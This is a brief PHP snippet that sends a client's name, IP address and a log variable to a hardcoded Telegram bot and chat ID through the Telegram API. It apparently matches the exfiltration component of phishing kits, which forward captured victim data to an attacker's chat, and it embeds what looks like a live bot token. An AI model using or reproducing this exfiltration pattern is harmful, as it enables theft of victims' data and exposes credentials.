<?php

$token = "6889975294:AAEwkUVz5cwkxhXYYQ5XwqasrjEhuxQXTN0"; // token bot
 
$data = [
    'text' =>"$name_client ($ip_client)
$log",
    'chat_id' => '1088915392'
];
 
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );



?>


